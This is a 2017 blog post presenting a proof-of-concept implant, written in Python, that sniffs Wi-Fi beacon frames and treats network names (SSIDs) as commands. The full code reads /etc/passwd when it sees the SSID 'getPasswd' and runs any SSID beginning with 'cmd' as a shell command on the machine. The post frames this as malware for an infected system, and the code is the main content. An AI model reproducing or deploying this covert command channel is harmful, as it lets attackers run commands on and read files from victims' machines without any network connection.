---
layout: post
title:  "Controlling a PC using Wifi SSID's"
date:   2017-04-9 12:18:29 +0200
categories: blog
---
# Controlling a PC using Wifi SSID's

There are different forms of controlling a system without connection with Internet or other network. In this PiC we will use the name of the wireless network, the SSIDs.

If infect a system only we will need that this have a wireless card, we will listen the network's names and if the malware find a name that it identify as a command, it will execute this command in the infected machine.

Let's do it, in first place we will need listen and parse the name of the wireless networks. For this task I will use the library socket, with this library is very easy parse a network packets. You can use scapy for this task also is very easy of use.



```python
import socket
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
sock.bind(("mon0", 0x0003))
while True:
        pkt = sock.recvfrom(2048)[0]
        if pkt[26] == "\x80" :
                if pkt[36:42] and ord(pkt[63]) > 0:
                        ssid=pkt[64:64 +ord(pkt[63])]
                        mac=pkt[36:42].encode('hex')
                        print("MAC:{0} SSID:{1}".format(mac,ssid))
```

We will need capture the Beacon frames, this type is the ID 0b1000 or 0x80 according the [IEEE 802.11 standard](http://grouper.ieee.org/groups/802/11/).

## Quick reference guide

|Type|SubtypeType(bin)|Description|
|:--:|:--:|:---------:|
|mgmt|0000|Association Request|
|mgmt|0001|Association Response|
|mgmt|0010|Reassociation Request|
|mgmt|0011|Reassociation Response|
|mgmt|0100|Probe Request|
|mgmt|0101|Probe Response|
|mgmt|1000|Beacon|
|mgmt|1001|ATIM|
|mgmt|1010|Disassociation|
|mgmt|1011|Authentication|
|mgmt|1100|Deauthentication|

## Code

Now, we already know obtain the network name, the next task is implement different commands.
This is the complete code of this PoC:
```python
#!/usr/bin/env python
import argparse
import subprocess
import socket
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))

parser = argparse.ArgumentParser()
parser.add_argument('-v', action='count', dest='verbose')
parser.add_argument('-i', dest='interface')
args=parser.parse_args()
sock.bind((args.interface, 0x0003))
while True:
        pkt = sock.recvfrom(2048)[0]
        if pkt[26] == "\x80" :
                if pkt[36:42] and ord(pkt[63]) > 0:
                        ssid=pkt[64:64 +ord(pkt[63])]
                        mac=pkt[36:42].encode('hex')
                        if ssid=="getPasswd":
                                out = subprocess.check_output(['cat','/etc/passwd'])
                                if args.verbose==1:
                                        print out
                        if ssid[0:3]=="cmd":
                                out = subprocess.check_output([ssid[3:]])
                                if args.verbose==1:
                                        print out
			if args.verbose==2:
                                print "SSID: %s  AP MAC: %s" % (pkt[64:64 +ord(pkt[63])], pkt[36:42].encode('hex'))
```

Regards!
